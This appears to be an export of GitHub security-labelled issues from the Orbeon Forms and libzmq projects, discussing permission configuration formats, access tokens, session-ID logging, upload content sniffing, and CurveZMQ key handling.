Regards.@cameron-elliott Many Orbeon users indeed already have a user management system. Of course, we agree that it would be nice if we could provide an out of the box option for those who don't have one, hence this RFE. Thanks for the feedback!",no,"Module: Form Runner,Type: RFE,Area: Security,"
orbeon/orbeon-forms,604207952,"Improve authentication/authorization support","This is a general issue. Possible improvements:

- Configuration UI
- LDAP / SAML / OAuth

Suggestions:

- Liferay UI
- [JFrog](https://www.jfrog.com/confluence/display/JFROG/Security)

See also:

- Provide API and/or UI for credentials #3660
- Ability to control services accessible by Form Builder/Form Runner #4397
- Support OAuth for calling services #2972

[+1 from customer](https://3.basecamp.com/3600924/buckets/12679874/messages/2597150447#__recording_2604335748)","+1 from customer or oauth

Support at least for:

- HTTP service calls
- `send` actions
",no,"Module: Form Runner,Module: Form Builder,Type: RFE,Area: Security,Type: Umbrella,"
orbeon/orbeon-forms,174084046,"Enable Reindex button only with admin role","Currently, we show the admin operations if at least one listed form supports admin operations. This includes the Reindex button.

However, the Reindex button is special:
- It currently doesn't apply to a particular form definition
- it is a time-consuming and a bit dangerous (if updates to the database take place while it's going on) operation

We should show that button only for certain users.

We don't yet have a fully general-purpose permissions system, but we could maybe have a separate property to specify one or more roles the user must have to enable this button (such as `orbeon-admin`).
",,no,"Module: Form Runner,Area: Security,"
orbeon/orbeon-forms,320091741,"Restrict the use of the `oxf:` protocol","In order to prevent more access, even with the ability to edit the source code of the form definition, we should have the ability to prevent the use of the `oxf:` protocol at the entire model level.

See also #3577.","Users might add models, but `components.xsl` annotates models so could add the necessary attributes.",no,"Module: Form Runner,Module: Form Builder,Module: XForms,Area: Security,"
orbeon/orbeon-forms,173881013,"FB: Validate changing app/form name against roles when editing source",,"We could check at two points:
1. Upon publishing.
   - We should probably always check upon publishing, since that's what matters the most for security purposes.
   - We would just show the Publish dialog with a disabled ""Publish"" button and a warning.
2. Upon applying changes to the source.
   - But we should also enforce it upon applying changes to the source, since that would violate a constraint which is currently enforced in the Form Settings.
   - How would the UI look like?
     - Prevent saving the source if the app/form name are not allowed?
     - Override app/form name with a warning?
[+1 from customer](https://3.basecamp.com/3600924/buckets/7545500/messages/1415108303)",no,"Module: Form Builder,Area: Security,"
orbeon/orbeon-forms,40284147,"Per-app and global permissions configuration","Currently, permissions can only be configured per form, and in Form Builder. We would like to extend that. Proposal:
- do this with JSON properties
- later, we'll have a general UI to update properties

Currently, the XML stored in the form looks like this:

``` xml
<permissions>
    <permission operations=""read update"">
        <group-member/>
    </permission>
    <permission operations=""read update"">
        <owner/>
    </permission>
    <permission operations=""create""/>
    <permission operations=""read update delete"">
        <user-role any-of=""manager""/>
    </permission>
</permissions>
```

_NOTE: The permissions are top-level in the XML, and have an_ or _meaning. They are designed this way for future extensibility, so that new condition types could be added. For example one could write (don't pay too much attention to the specific condition syntax):_

``` xml
<permission operations=""read update"">
    <group-member/>
    <condition xpath=""//type = 'gaga' and document-age-days() gt 10""/>
</permission>
```

The JSON configuration could look like:
1. the current FB UI, which is easier to understand
2. or like the current XML data, which is more extensible

``` json
[
    {                                  ""permissions"": ""create""                    },
    { ""standard-role"": ""owner"",        ""permissions"": ""read update""               },
    { ""standard-role"": ""group-member"", ""permissions"": ""read update""               },
    { ""user-role"":     ""manager"",      ""permissions"": ""create read update delete"" }
]
```

Or:

``` json
[
    { ""operations"": ""read update"",        ""conditions"": [ { ""name"": ""owner"" } ]                          },
    { ""operations"": ""read update"",        ""conditions"": [ { ""name"": ""group-member"" } ]                   },
    { ""operations"": ""create""                                                                             },
    { ""operations"": ""read update delete"", ""conditions"": [ { ""name"": ""user-role"", ""any-of"": ""manager"" } ] }
]
```

We would then just need to check properties in `FormRunnerPermissions.authorizedOperationsBasedOnRoles` if the form itself doesn't have permissions.

Property could be:

``` xml
<property as=""xs:string""  name=""oxf.fr.permissions.*.*"">
    [ â€¦ ]
</property>
```
","In addition, the Home page should provide visibility on actual permissions.
[+1 from evaluator](https://mail.google.com/mail/u/0/#inbox/1556ee2dd8ff9427)
Permissions are currently checked in `persistence-model.xml`, calling with `xxf:instance('fr-form-metadata')/permissions`:

``` xpath
frf:xpathAllAuthorizedOperations()
frf:allAuthorizedOperationsAssumingOwnerGroupMember()
frf:authorizedOperationsBasedOnRoles()
```

All functions are implemented in `FormRunnerPermissions`. They call:
- `allAuthorizedOperations()`
  - calls `authorizedOperationsBasedOnRoles()`
  - also checks `owner` and `group-member`
- `authorizedOperationsBasedOnRoles()`
  - checks roles

In all these cases, when no `permissions` element is provided, we would instead obtain the permissions from properties.

If the format in properties is JSON, it would be good to convert both XML and JSON to a Scala representation, so the code checking permissions is not duplicated.
With #2256, we were planning to have a different representation for permissions when using the workflow feature. So we might have two different initial formats for permissions: the current one and the workflow one (when workflow feature is in use). The idea, in that case, was to ""generate workflow config from existing permissions config"" in the form definition.

But we also wanted to ""strip workflow from metadata column / metadata.xml and only keep short permissions"" at runtime, which is what interests us here. Would that ""short permissions"" format be like the current format, or different?

If think that for now, if we want to implement this issue before #2256, we would just pick a JSON format and convert to the current XML format. If #2256 creates a new ""short format"", we can adapt. Anyway we will need the ability to keep supporting the current format if we introduce a new one.
Steps:
- [x] pick JSON format for use in properties (and maybe, later in form definition)
- [x] convert from JSON to Scala representation
- [x] update `FormRunnerPermissions`
  - [x] read permissions from properties if no permissions specified in form definition
  - [x] check permissions based on Scala representation
- [ ] docThe format should also support:
- conjunctions of conditions (#2420), even if that's just for future extensibility
- value-based checks

Could you say:

``` json
""standard-role"": ""group-member"", ""user-role"": ""manager""
```

Which would translate into ""must be group member AND have `manager` role"". Disjunctions can be  implemented by adding multiple lines, probably.

For value checks, we could use an array of `name`/`value` objects:

``` json
""value-match"": [
  {
    ""name"":  ""xh:head/xf:model[@id = 'fr-form-model']/xf:instance[@id = 'fr-form-metadata']/*/application-name"",
    ""value"": ""orbeon""
  },
  {
    ""name"":  ""xh:head/xh:head/xf:model[@id = 'fr-form-model']/xf:instance[@id = 'fr-form-metadata']/*/form-name"",
    ""value"": ""bookshelf""
  }
]
```

The example above would relate to a Form Builder permission to access `orbeon/bookshelf`.
[+1 from customer](https://3.basecamp.com/3600924/buckets/5300917/messages/1619052500)[+1 from customer](https://3.basecamp.com/3600924/buckets/1966556/messages/1970510227#__recording_2118819711) for default permissions[+1 from customer](https://3.basecamp.com/3600924/buckets/7993860/messages/2387911202)[+1 from customer](https://3.basecamp.com/3600924/buckets/23878674/messages/5168267407) in the context of #5397I'd suggest that the JSON format follow something close to the current Form Builder UI for permissions. I am not sure if the scenario where we want to enable a conjunction of conditions (#2420) is important or not, or how it relates to the workflow permissions. But a simple format matching what we have now would be something like this:

```json
{
  ""anyone"": [ ""create"" ],
  ""owner"": [ ""read"", ""update"" ],
  ""group-member"": [ ""read"", ""update"" ],
  ""roles"": [
    {
      ""role"": ""orbeon-user"",
      ""permissions"": [ ""read"", ""update"", ""list"" ]
    },
    {
      ""role"": ""orbeon-admin"",
      ""permissions"": [ ""read"", ""update"", ""delete"", ""list"" ]
    }
  ]
}
```

Or maybe:

```json
{
  ""anyone"":       { ""permissions"": [ ""create"" ] },
  ""owner"":        { ""permissions"": [ ""read"", ""update"" ] },
  ""group-member"": { ""permissions"": [ ""read"", ""update"" ] },
  ""roles"": [
    {
      ""role"": ""orbeon-user"",
      ""permissions"": [ ""read"", ""update"", ""list"" ]
    },
    {
      ""role"": ""orbeon-admin"",
      ""permissions"": [ ""read"", ""update"", ""delete"", ""list"" ]
    }
  ]
}
```

Or even:

```json
{
  ""anyone"":         [ ""create"" ],
  ""owner"":          [ ""read"", ""update"" ],
  ""group-member"":   [ ""read"", ""update"" ],
  ""roles"": {
    ""orbeon-user"":  [ ""read"", ""update"", ""list"" ],
    ""orbeon-admin"": [ ""read"", ""update"", ""delete"", ""list"" ]
  }
}
```

The last format is the most concise. It's fairly consistent.

I suggest that it's better to split permission tokens in an array, rather than:

- using a space-separated string
- or something more complicated like `{ ""read"": true, ""update"": false }`
",no,"Module: Form Runner,Module: Form Builder,Type: RFE,Area: Security,2 Points,"
orbeon/orbeon-forms,1012607772,"Prevent starting filling out a form if before resolving captcha","Currently, the captcha influences the validity of the form, so form authors can stop users from saving or submitting a form before the captcha is filled. This RFE calls for preventing users from even starting to fill out a form before solving a captcha, this primarily to prevent DoS on forms with attachment fields, where users can attach files, which are sent and stored on the server, this before having solved a captcha.

[+1 from customer](https://3.basecamp.com/3600924/buckets/14122811/messages/4070608144)",,no,"Type: RFE,Area: Security,"
orbeon/orbeon-forms,345937696,"Provide API and/or UI for credentials","Something like [Vault](https://github.com/hashicorp/vault) might be worth looking into.","[+1 from customer](https://3.basecamp.com/3600924/buckets/1966717/messages/1203203482#__recording_1210255573)We have some credentials we store in properties right now:

- `oxf.crypto.password`
- `oxf.http.ssl.keystore.password` (when in use)

In addition, credentials to call services are often embedded into the forms, or in base URLs in properties-local.xml.
See also #3632.If a Java API, we already have something similar for virus scanning, see #2855.A suggestion from customer is to have a system of aliases:

- a Form Runner / Form Builder configuration allows you to set user aliases
- you refer to those aliases from Form Builder
",no,"Type: RFE,Area: Security,"
orbeon/orbeon-forms,38910305,"Upload: assign mediatype based on content sniffing","- it's never reliable to depend on the client
- see also [this article](http://techblog.procurios.nl/k/news/view/15872/14863/mimetype-corruption-in-firefox.html)

[+1 from customer](https://basecamp.com/1721271/projects/4504110/messages/28581380)
","For sniffing the media type on the server, [Apache Tika](http://tika.apache.org/) seems to be a good option.

[+1 from customer](https://basecamp.com/1721271/projects/2789956/messages/26991194)
Would be a really useful one but as of 2014-07, both customers don't have this high on their priority list.
[+1 from customer](https://3.basecamp.com/3600924/buckets/2192969/messages/2371554073)[+1 from customer](https://3.basecamp.com/3600924/buckets/6794635/messages/2476910169)One issue with Apache Tika is that it will pull in *many* dependencies. See the [`pom.xml`](https://github.com/apache/tika/blob/master/tika-parsers/pom.xml).The main worry with adding many dependencies is security vulnerabilities. So we should attempt to control which exact formats we support and only take in a few external dependencies. For example, we probably don't need to detect Ogg Vorbis formats out of the box. But we need:

- PDF
- common image/video/audio formats
- Excel/Word (maybe we can just extract the relevant code from POI)
- plain text formats
A quick list of dependencies this would add:

```
org.gagravarr.vorbis-java-tika
org.tallison.jmatio
org.apache.james.apache-mime4j-core
org.apache.james.apache-mime4j-dom
org.apache.commons.commons-compress
org.tukaani.xz
com.epam.parso
org.brotli.dec
com.github.luben.zstd-jni
commons-codec.commons-codec
org.apache.pdfbox.pdfbox
org.apache.pdfbox.pdfbox-tools
org.apache.pdfbox.preflight
org.apache.pdfbox.jempbox
org.apache.poi.poi
org.apache.poi.poi-scratchpad
org.apache.poi.poi-ooxml
com.healthmarketscience.jackcess.jackcess
com.healthmarketscience.jackcess.jackcess-encrypt
org.ow2.asm.asm
com.googlecode.mp4parser.isoparser
de.l3s.boilerpipe.boilerpipe
com.rometools.rome
org.gagravarr.vorbis-java-core
com.googlecode.juniversalchardet.juniversalchardet
org.codelibs.jhighlight
com.pff.java-libpst
com.github.junrar.junrar
org.apache.cxf.cxf-rt-rs-client
org.apache.commons.commons-exec
org.xerial.sqlite-jdbc
org.apache.opennlp.opennlp-tools
commons-io.commons-io
com.googlecode.json-simple.json-simple
com.github.openjson.openjson
com.google.code.gson.gson
org.slf4j.jul-to-slf4j
org.slf4j.jcl-over-slf4j
edu.ucar.netcdf4
org.jdom.jdom2
com.google.guava.guava
edu.ucar.grib
com.beust.jcommander
net.java.dev.jna.jna
org.jsoup.jsoup
com.google.protobuf.protobuf-java
edu.ucar.cdm
org.quartz-scheduler.quartz
com.mchange.c3p0
edu.ucar.httpservices
org.apache.commons.commons-csv
org.apache.sis.core.sis-utility
org.apache.sis.storage.sis-netcdf
org.apache.sis.core.sis-metadata
org.opengis.geoapi
edu.usc.ir.sentiment-analysis-parser
org.apache.ctakes.ctakes-core
org.apache.uima.uimafit-core
org.apache.uima.uimaj-core
org.apache.pdfbox.jbig2-imageio
com.github.jai-imageio.jai-imageio-jpeg2000
```

We already depend on:

```
org.bouncycastle.bcmail-jdk15on
org.bouncycastle.bcprov-jdk15on
org.ccil.cowan.tagsoup.tagsoup
org.tallison.metadata-extractor
org.slf4j.slf4j-api
junit.junit
org.mockito.mockito-core
org.slf4j.slf4j-log4j12
org.apache.httpcomponents.httpclient
org.apache.httpcomponents.httpmime
com.fasterxml.jackson.core.jackson-core
com.fasterxml.jackson.core.jackson-databind
com.fasterxml.jackson.core.jackson-annotations
com.github.jai-imageio.jai-imageio-core
```[+1 from customer](https://3.basecamp.com/3600924/buckets/1966556/messages/2491040401)I verified that even with a plain upload field outside of Orbeon Forms, the `File` object's `type` is blank when using for example  a `.msg` extension, while it is present for things like images.

Besides content sniffing, we could also use the filename extension to guess a content type if the browser doesn't send one, or as a replacement for the type sent by the browser.",no,"Type: RFE,Module: XForms,Area: Security,Top RFE,"
orbeon/orbeon-forms,47304290,"Prevent multiple sends","Scenario:
- new
- user presses ""Send"" button
- navigate to confirmation page
- user does browser back
- user presses ""Send"" button again

After a `send`, there should be an option (or by default) to mark the form as sent. This could be built into the `send` action, or be a separate action, like `set-form-state(state = ""sent"")` (and we could have things like `set-form-state(state = ""readonly"")`).

This way, when a user does a browser back, the page would show, but visually it might not show form data (for force readonly) but show a message saying that form data was sent, thank you.

_NOTE: We agree with this [SO question](http://stackoverflow.com/questions/12381563/how-to-stop-browser-back-button-using-javascript) that trying to prevent browser back should be avoided._

Issues:
- If new â†’ review â†’ confirmation, and browser does back â†’ back, state would not be available in restored new page. Is this a real issue?

Other possibility: it would be possible, upon `send` or after, to remove the document from cache. This way the document would show, but fail to restore, and ""Send"" wouldn't work. But this would seem to be quite broken behavior. The main option above seems better.
- [+1 from customer](https://basecamp.com/1721271/projects/3412232/messages/32958499)
- [+1 from discuss](http://discuss.orbeon.com/How-to-implement-a-custom-quot-Finish-page-quot-best-td4659431.html)
","We have this property, which upon browser back/refresh does a reload instead:

``` xml
<property as=""xs:string"" name=""oxf.xforms.revisit-handling"" value=""reload""/>
```
Related, although not quite a duplicate I think: #1726.
See also  #2514, #1908.[+1 from customer](https://3.basecamp.com/3600924/buckets/4224335/messages/1462309189#__recording_1462616395)For now keeping as a separate RFE, as workflow stages (#2256) will not do this automatically. See #2514 for the umbrella issue.",no,"Module: Form Runner,Area: Security,Area: Usability,"
orbeon/orbeon-forms,1363925006,"Ability to require access token","- When accessing a form, if an access token is required:
    - It needs to be provided on the URL, e.g. `?orbeon-access-token=159b0c4aee9a825be489507183f1cec03951da63`
    - As soon as the page is loaded, the `orbeon-access-token` is removed from the URL (`History.replaceState`)
- The access token is computed and verified as follows
    - It is computed by combining the following pieces of information: app name + form name + form version + document id + expiration timestamp
    - The expiration timestamp is computed as `current-dateTime()` + duration from the `oxf.fr.access-token.validity.*.*`
    - This combination is encrypted with the access token key, from `oxf.fr.access-token.key.*.*`
    - The access token is verified by decrypting it with the access token key, and verifying that the app name, form name, form version, and document id correspond to the document the user trying to access, and that the expiration timestamp is in the future
- Changes to the `fb:parameter-editor`
    - For Edit and View page, add a checkbox ""Include access token""
    - (It's up to the form author to make sure they don't include the token for logged in users, if they don't want)
    - (The `fb:parameter-editor` is used in the Email Settings, Control Settings, and Section/Grid Settings dialog)
- Permissions dialog
    - The Permissions dialog is changed as follows
        - Anyone
            - Require token
        - Any authenticated user
        - Owner
        - Group
        - Role a
    - Checkbox logic
        - ""Anyone"" without ""Require token"" implies all the checkboxes on the same column are checked and readonly
        - (The above implied checkboxes are dealt with in the same as the existing implied checkboxes, aka ""virtually checked"")
- Out of scope for this RFE
    - The ability to invalidate specific tokens
    - Requiring an access token to fill out a new form
        - In that case the access token just wouldn't contain the document id, and such an access token would only be usable to fill out a new form
        - Use case: skipping having to create data for that user before we send the link, maybe providing some initial data in request parameters
    - An API to generate an access token for a given app, form, version, document id
    - In `fb:parameter-editor`, a way to dynamically determine whether an access token is included in the URL

[+1 from customer](https://3.basecamp.com/3600924/buckets/23878674/messages/5289266047)

","I changed the title and the above description for this RFE based on some brainstorming done with @ebruchez today.We discussed more with @avernet today. There is some trade-off between two options:

- stored tokens
- computed tokens

For reference, [RFC 9068](https://datatracker.ietf.org/doc/html/rfc9068) ""defines a standard way to use JWTs as access tokens"", and this [OAuth doc](https://www.oauth.com/oauth2-servers/access-tokens/self-encoded-access-tokens/) discusses ""self-encoded tokens"".Following discussion, there are the reasons we wouldn't want to use JWT:

- it requires a private/public key setup, which we don't want to require at this time
- tokens might be much larger
",no,"Module: Form Runner,Module: Form Builder,Type: RFE,Area: Security,"
orbeon/orbeon-forms,1184917889,"Add a mechanism to stop LifecycleLogger.scala from logging out value of JSESSIONID","Orbeon logs out value of JSESSION id cookie:

2022-03-25 08:52:48,458 org.orbeon.oxf.logging.LifecycleLogger$.event(LifecycleLogger.scala:103)  INFO  lifecycle - event: {""request"": ""1"", ""session"": ""EB57E453E2A45DFB5256F82031F60D87"", ""source"": ""service"", ""message"": ""start: handle""}

According to [OWASP v4.0.3 V7.1.1](https://github.com/OWASP/ASVS/blob/v4.0.3/4.0/en/0x15-V7-Error-Logging.md#v71-log-content):

> Verify that the application does not log credentials or payment details. Session tokens should only be stored in logs in an irreversible, hashed form.

Problem is that whoever has access to logs could take over user's session.

Possible solutions:
* add a configuration key to replace value of JSESSIONID with ""***"" or with a hashed value of JSESSIONID
* log out JSESSIONID with a different logger (so it would be able to exclude it from being logged out).


","I think that's a reasonable suggestion.",no,"Area: Security,"
orbeon/orbeon-forms,21935500,"FR Home: don't show remote info for forms w/o admin permission","E.g. on attached screenshot, we see remote Status and Modified information. Those should be N/A.

![screen shot 2013-10-31 at 4 50 12 pm](https://f.cloud.github.com/assets/105769/1450883/3ff4d236-4287-11e3-8d68-dc229023a3f1.png)

Also on this screenshot, if the form is only available remotely, the row must not be shown.

![screen shot 2013-10-31 at 5 04 27 pm](https://f.cloud.github.com/assets/105769/1451002/5a18f00e-428a-11e3-9fc9-3751d8435014.png)
",,no,"Module: Form Runner,Area: Security,1 Point,"
orbeon/orbeon-forms,104617803,"Out of the box solution to protect Orbeon WAR when using proxy portlet","We are recommending an IP filter for example using [UrlRewriteFilter](http://cdn.rawgit.com/paultuckey/urlrewritefilter/master/src/doc/manual/4.0/index.html), but we don't document it and it's not out of the box.
","This needs some further thinking.
",no,"Area: Security,Module: Portlet support,"
orbeon/orbeon-forms,174140204,"Umbrella: Improved permissions","Covers the following related issues:
- Per-app and global permissions configuration #1860
- Permissions based on field value #1487
- Separate Form Builder and Home page permissions #2906
- FB permissions must specify CRUD operations #1149
- Enable Reindex button only with admin role #2905
","#1860 can be implemented no matter what.

One that is done, it will be possible to setup CRUD Form Builder permissions independently from `form-builder-permissions.xml`.

However, this will not cover value-based permissions, which requires #1487.

We can then do #2906/#1149 and deprecate `form-builder-permissions.xml`.
",no,"Module: Form Runner,Module: Form Builder,Type: RFE,Area: Security,Type: Umbrella,"
orbeon/orbeon-forms,182134063,"Option to cleanup field values, to avoid XSS","In some cases, field values may be shown by other apps, where they may not be properly escaped. Thus in certain cases, to avoid possible risks of XSS, users would like Orbeon Forms to filter out values containing text, like `<script>`, which could be used for XSS.

This should be an option, and could be enabled globally on a per app/form basis through a property, for a given form in Form Builder's Form Settings dialog, or per field in the relevant field's Control Settings.

[+1 from community](http://discuss.orbeon.com/call-clean-html-xpl-for-whole-instance-td4661830.html)
",,no,"Module: Form Runner,Type: RFE,Area: Security,"
orbeon/orbeon-forms,46423182,"Improve authentication scenarios","Issues:
- [ ] Support requiring authentication for summary page but not new page #1292 
- [ ] Per-app and global permissions configuration #1860
",,no,"Area: Security,Type: Umbrella,"
orbeon/orbeon-forms,1087946348,"Import page: consider improving permissions","Following #2840 security considerations, should we prevent access to `/import` if the user doesn't have `create` permissions for the given form?

For an import which just requires `create` permissions, we could:

- require that the user has `create` permission for the given form
- or consider that the user is a sort of ""admin"" always able to create
  - but we don't have a way to represent that permission
  - in general, we should have permissions such as ""has access to the import page"" and ""has access to the admin page""

Being able to create data is not as much of a problem as being able to read or modify data. So we can defer this question to a separate issue.
",,no,"Module: Form Runner,Area: Security,"
orbeon/orbeon-forms,17284290,"FB permissions must specify CRUD operations","Right now, there is confusion with the support for `form`. As the [doc](https://sites.google.com/a/orbeon.com/forms/doc/developer-guide/form-runner/access-control?pli=1#TOC-Access-to-specific-apps-forms-in-Form-Builder-form-builder-permissions.xml-) says:

""Restrictions on the form name in form-builder-permissions.xml are at this point not supported; only restrictions on the app name are supported. This means that you should always use `form=""*""`. If you define a restriction on the form name, it won't be enforced at the time the form is created, allowing users to create, save, and publish a form with an undesirable name. However they then won't be able to see the form they created when going back to the summary page.""

This would be solved with more specific CRUD operations:
- user can `read` and `update` a form definition
- user cannot `create` a new one

Might need an additional `publish/unpublish` permission?

Ideally, this should be unified with the FR permissions.
","[+1 from potential customer](https://mail.google.com/mail/u/0/#inbox/141ebb9ef16232bd).
",no,"Module: Form Builder,Type: RFE,Area: Security,"
orbeon/orbeon-forms,21918758,"FR Home: discrepancy with Summary permissions","Permissions setup  from test plan.
- Anyone â†’ create
- orbeon-sales â†’ Read and Update
- add Owner â†’ Read

For `orbeon-user`, sales/my-sales-form has link to Summary, but Summary does a 403. The link should not be there, following the same logic that is in the Summary page.
",,no,"Module: Form Runner,Area: Security,2 Points,"
orbeon/orbeon-forms,21557610,"FB: Add permission to publish a form","See [thread](http://discuss.orbeon.com/How-to-disable-the-Publish-button-in-orbeon-form-builder-and-role-access-it-td4657544.html).
",,no,"Module: Form Builder,Type: RFE,Area: Security,"
orbeon/orbeon-forms,556385401,"Ability to control services accessible by Form Builder/Form Runner","[+1 from customer](https://3.basecamp.com/3600924/buckets/7044591/messages/2369146654)

Format of the whitelisting TBD. Squid has a very simple format where you just list domains, possibly with a leading `.`:

    acl whitelist dstdomain .whitelist.com .goodsite.com .partnerssite.com

The following would be useful:

- wildcards
- blacklisting
- filtering based on paths as well, not only domains
",,no,"Module: Form Runner,Module: Form Builder,Type: RFE,Area: Security,"
zeromq/libzmq,32484408,"Problem: libzmq doesn't implement ERROR commands","Solution: the stream engine should send back an ERROR command (see RFC 23) when there's a protocol or access error. The ERROR command carries a text explanation, which can be ""protocol error"" or ""access refused"".
","In case of ZAP errors, this is done now, but not in other cases, e.g. in case of a mechanism mismatch.",no,"Feature Request,Area (Runtime / Usage),Security,"
zeromq/libzmq,39363889,"Secret keys should be stored in memlock'd memory only","To avoid risk of private keys being swapped to disk, the memory storing them should be memlock'd.

zmq_z85_{decode,encode} should probably insist on using registers for sensitive key data as well.
","Hello,
`zmq_z85_{encode,decode}` are, in my opinion, general purpose encoding and decoding function. I don't think they should take special care about how they manipulate data. Maybe a secure version of those functions could be provided if there is need for it.

I think preventing critical data from being swapped to disk is not the library role, and swap should be encrypted if writing data to it can be problematic.
libsodium has cross platform support for guarded heap allocations, since zeromq uses it all that would be necessary would be to use sodium_malloc and sodium_free instead of the normal malloc and free.
For extra security those pages could be locked while they are not needed aka sodium_mprotect_noaccess and sodium_mprotect_readonly.

http://doc.libsodium.org/helpers/memory_management.html
",no,"Feature Request,Area (Runtime / Usage),Area (API change),Security,"
zeromq/libzmq,267392630,"Make ZAP usage control explicit","As discussed in #2762, replace ZMQ_ZAP_ENFORCE_DOMAIN by ZMQ_ZAP_USAGE or similar.","This issue has been automatically marked as stale because it has not had activity for 365 days. It will be closed if no further activity occurs within 56 days. Thank you for your contributions.
This should still be improved.",no,"Area (Runtime / Usage),Area (API change),Security,Problem reproduced,"
zeromq/libzmq,32484485,"Problem: connection retries forever after authentication failure","Solution: when the server replies with ERROR (see #989), the client should not reconnect.
",,no,"Feature Request,Area (Runtime / Usage),Security,"
zeromq/libzmq,221464902,"Associating multiple public keys to one listener socket in CurveZMQ","Right now while using CurveZMQ, client needs to know the server public key and server can have only one public key.

Sample server code

```
listener = ctx.socket(zmq.ROUTER)
publicServer, secretServer = get_keys()
listener.curve_secretkey = secretServer
listener.curve_publickey = publicServer
listener.curve_server = True
```

Sample client code

```
sock = context.socket(DEALER)
sock.curve_publickey = localPubKey
sock.curve_secretkey = localSecKey
sock.curve_serverkey = publicServer
```

But what if we needed the server to have a unique public key for each client, i know it does not make sense in a client server pattern, but consider a peer to peer communication where peers have pairwise connection and each peer has a unique keypair for another peer, now we can have multiple listeners for each keypair (peer) but that restricts to 64K (since each listener binds to one port). Does CurveZMQ have a hook that i can use to check for the public key for any peer connection, its like plugging in a keystore in CurveZMQ. I am using zeromq 4.1.2. Thanks

**UPDATE:**
Example Scenario: Bob and Carol want to talk to Alice but Alice does not want them to know that they talked to the same person (Alice) hence she decides to use give 2 different public keys to Bob and Carol, Pb and Pc respectively. Now Alice opens up 2 listeners on 2 different ports 9701 and 9702 and associates Pb to 9701 and Pc to 9702. Now Bob connects to Alice on port 9701 using key Pb and Carol connects to Alice on port 9702 using key Pc, now even if Bob and Carol communicate and try to decide if they talked to the same person, they cannot (Assume Alice can make the IPs look different to Bob and Carol). But Alice has consumed 2 ports numbers, 9701 and 9702. This is fine until Alice has to talk to only, say few hundred people but if Alice wanted to talk to 100K people, it can generate 100K different keys but wont be able to allocate 100K different ports? So is it possible to use only one port and somehow decide on the fly when the message arrives which keypair to use? ","Yes, see https://rfc.zeromq.org/spec:27/ZAP/You can, and if you use CZMQ it's made quite simple with the zcert classes:

https://github.com/zeromq/czmq/blob/master/examples/security/ironhouse2.c@bluca I still cannot see how the server could use different public keys for different clients. I have updated the description, maybe that makes the scenario clear.@evoskuil I could not see how, can you please say a little more? Do you mean using Proxy Handlers, Thanks
Sorry from the first description I thought you meant having the clients public keys on the server for authentication, ie the ironhouse pattern

A server can only have one public key AFAIK.
Also I don't see how having multiple public keys would be useful, as the endpoint would have to be the same anyway so there's no additional privacy added. You can use multiple servers if that's what you need.@bluca Endpoint can be made different, right? If my networking infrastructure can make sure that connections in the IP range 52.133.x.x to 52.139.x.x for all ports route to the same listener socket, then clients connecting cannot figure out if they are talking to same person or notThen your firewall that does that NATting will be the single entry point shared by all clients, so again no point
But if you really want to do that, just use multiple server sockets@bluca What if there are multiple **Alice**s (Servers)? So Alice has 3 brothers and 2 sisters called b1, b2, b3, s1 and s2. Now Bob and Carol should not know if they are talking to Alice or to one of its siblings Actually they should: https://en.wikipedia.org/wiki/End-to-end_principle

But besides that, a per-client server public key simply does work in the Curve mode, please read the spec:

https://rfc.zeromq.org/spec:26/CURVEZMQIn a p2p context everyone can have 1 private key and the public keys of all others. Using authentication a peer can the restrict which peers may connect to its endpoint. The configuration would require that each peer use its private key to establish both the ""sever"" and ""client"". This could be done with distinct keys as well, but that's unnecessary.For this use case we came up with the following plan.


_Every Client of a particular CurveZMQ server is configured with a unique Server Public Key.
CurveZMQ Server is configured to point to a list of Long Term Key Pairs instead of a single {s, S}
{s1, S1} , {s2, S2}, . . . . {sx, Sx}, . . . {sn, Sn} 

At the start of communication, a particular client 'x' sends a modified HELLO to the server. The modified HELLO includes additional 32 OCTETs which is the server long term public key.

On receiving the Hello the server looks up the public key Sx and locates the corresponding secret key sx and associates that key with the client for all further communication.

Rest of the Commands WELCOME, INITIATE, READY MESSAGE all continue as usual except they use the particular secret key sx and expect particular public key Sx to be used for all communication with that particular client_


I would like some feedback from you folks, do you see a security issue here of any kind or any other issue.Aside from any security issue, the main problem is that it's a backward-incompatible change in the protocol :-/> At the start of communication, a particular client 'x' sends a modified HELLO to the server. The modified HELLO includes additional 32 OCTETs which is the server long term public key.

@FarooqKhan  

I see two important problems with this design:
- this leaks the server public key and allows an eavesdropper to generate valid HELLO commands. This would require the server not only to verify the client signature box but (since this is valid) also generate an ephemeral key pair, which allows an attacker to waste a lot more server cpu cycles.
- this effectively leaks the identity of the client to an eavesdropper (since they all use a unique server public key).

The first problem can be solved by hashing the public key. 

I can see no perfect solution to the second problem. 

You could add a nonce to the hash but this would prevent you from calculating the hash at socket configuration time and require the server to calculate half many hashes as it has server public keys (on average) for every client connection. Way too expensive.

You could use the server endpoint identifier (which is available at socket configuration time) as nonce but then a snooper could still uniquely identify each client as long as the server endpoint remains the same. I consider this to be less of a problem because as long as the endpoint identifier does not change, it is trivial for Bob and Carol to discover they are talking to the same Alice. If this changes regularly (on both sides), a snooper can no longer uniquely identify the client or server. Good enough I'd say (especially since this anonymity will only work with changing IP addresses).
@JoveToo thanks for taking the time to study this and reply. 

To solve the second problem what if we took a Server Public Key split it into Shamir Secret pieces and the client sends the required number of pieces during the HELLO For each new HELLO choosing random pieces of required threshold. The server can use the pieces and construct the Public key since it will always receive the necessary number of parts. How many parts to split in and the threshold can be predefined. The problem does not go away entirely but becomes a little bit difficult, If we split the public key into lots of pieces it does become quite difficult@FarooqKhan 
If you present the server with sufficient number of pieces to reconstruct the public key, the eavesdropper can reconstruct it as well? If you do not present enough pieces, the server still has to evaluate on average half his public keys.You are right its not a solution just postponing the problemI cannot help but think it would make more sense to design a new protocol for this than trying to add this to CurveZMQ.",no,"Feature Request,Request For Comments,Security,Area (Protocol),"
zeromq/libzmq,248025634,"Status text returned by a ZAP handler is masked","The status text returned by a ZAP handler, particularly for status codes other than 200, is masked. It is not accessible by the application nor by an administrator.

It would be good to include it in the corresponding monitor event, but this would require a change to the socket monitor protocol, allowing an alternate or additional information to the address.","There are also other situations, where it might make sense to include an additional description, e.g. for the various ZMTP protocol errors.@sigiesec I think you implemented this, right?No... This is still unresolved. Do you think the monitoring event format can be modified/extended?Mh I guess it would be hard to do without breaking backward compatMaybe require opting in via a context option?We have already so many options...
What if the new (or some of the current draft) events had additional multipart frames?There are only few context options?

